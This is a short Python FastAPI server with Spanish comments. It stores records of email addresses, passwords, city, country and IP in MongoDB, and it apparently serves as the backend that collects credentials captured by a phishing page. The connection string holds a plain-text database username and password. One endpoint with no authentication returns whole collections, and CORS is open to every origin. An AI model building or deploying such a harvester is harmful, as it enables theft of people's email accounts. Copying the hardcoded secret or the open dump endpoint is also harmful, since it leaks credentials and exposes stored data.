from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from pymongo import MongoClient
from fastapi.responses import JSONResponse
import json

# Conexión a la base de datos MongoDB
uri = "mongodb+srv://torresyuliana382:ZFAsVwH2gAIEm1ic@cluster0.ndoznk5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(uri)
db = client['correos']

app = FastAPI()

# Definición de modelos con Pydantic
class Correo(BaseModel):
    correo: str
    contra: str
    ciudad: str
    pais: str
    ip: str

# Middleware para habilitar CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Permite solicitudes desde cualquier origen
    allow_credentials=True,
    allow_methods=["GET", "PUT", "OPTIONS"],  # Métodos permitidos
    allow_headers=["*"],
)

# Ruta para manejar las solicitudes OPTIONS
@app.options("/{collection_name:path}")
async def options_route(collection_name: str):
    return JSONResponse(status_code=200)

# Ruta para obtener todos los elementos de la colección
@app.get("/tabla/{collection_name}")
async def get_tabla(collection_name: str):
    collection = db[collection_name]
    documentos = collection.find()
    
    # Convertir los documentos a una lista de diccionarios
    documentos_dict = [doc for doc in documentos]
    
    # Limpiar los datos antes de serializar a JSON
    for documento in documentos_dict:
        # Eliminar el campo "_id" si existe
        if "_id" in documento:
            del documento["_id"]
    
    # Serializar los documentos a JSON con formato
    documentos_json = json.dumps(documentos_dict, indent=4)
    
    # Devolver los documentos en formato JSON
    return documentos_json

# Ruta para agregar un nuevo documento a la colección
@app.put("/submit/{collection_name}")
async def submit(collection_name: str, correo: Correo):
    collection = db[collection_name]
    documento = correo.dict()
    collection.insert_one(documento)
    return {"message": "Documento agregado correctamente"}
